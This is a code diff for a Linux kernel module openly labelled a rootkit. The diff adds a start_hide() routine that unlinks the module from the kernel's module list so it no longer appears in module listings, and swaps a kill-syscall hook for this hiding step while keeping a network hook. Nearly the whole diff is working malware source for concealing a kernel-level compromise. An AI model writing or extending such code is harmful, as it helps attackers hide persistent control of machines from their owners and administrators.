@@ -3,12 +3,23 @@
 #include "../include/hook_net.h" 
 #include "../include/hook_kill.h"
 
+struct list_head *prev_module;
 
+#ifdef MODULE
+extern struct module __this_module;
+#define THIS_MODULE (&__this_module)
+#else
+#define THIS_MODULE ((struct module *)0)
+#endif
+
+void start_hide(void){
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
 
 int init_module() {
   printk(KERN_INFO "Starting Rootkit\n");
-  //get_syscall_table_ptrs();  
-  init_kill_hook();
+  start_hide();
   register_net_hook();
   return 0;
 }
@@ -16,7 +27,6 @@ int init_module() {
 
 void cleanup_module() {
   nf_unregister_net_hook(&init_net, &nfhook);
-  remove_hook_kill()
   printk(KERN_INFO "Stoping Rootkit\n");
 }
 
